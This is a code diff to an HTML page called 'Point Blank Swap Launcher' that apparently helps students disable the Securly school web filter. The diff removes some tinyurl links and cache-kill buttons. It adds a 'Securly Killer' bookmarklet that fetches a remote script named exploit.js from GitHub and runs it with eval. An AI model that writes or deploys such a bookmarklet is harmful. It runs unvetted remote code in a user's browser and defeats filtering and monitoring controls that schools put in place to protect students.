@@ -140,20 +140,12 @@ doc.write(`
     <center><h1>Point Blank Swap Launcher</h1></center>
 
     <h2>――――――Securly Killer ――――――</h2>
-    <p><span id='eee'>Securly Links</span>▼</p>
-    <div id='links'>
-      
-    <a href='https://tinyurl.com/goofcurly'>securly</a>  &bull; 
-      <a href='https://tinyurl.com/goofclassroom'>securly classroom</a>  &bull; 
-     
-      <br>
-    </div>
-    <p>After visiting link:</p>
-    <button id='cachekill'>[Securly only] Hard Kill (cache)</button>
     
-    <button id='hardkillrev'>Revert Hard Kill</button>
-    
-   
+  <div class="bookmarklet">
+        <h3>Securly Killer</h3>
+       
+        <a class="button" href="javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);">Securly Killer</a>
+      </div>
     <h2>――― Change tab URL (about:blank) ―――</h2>
     <input id='url'>
     <button  id='change'>Change tabs (Useless)</button>
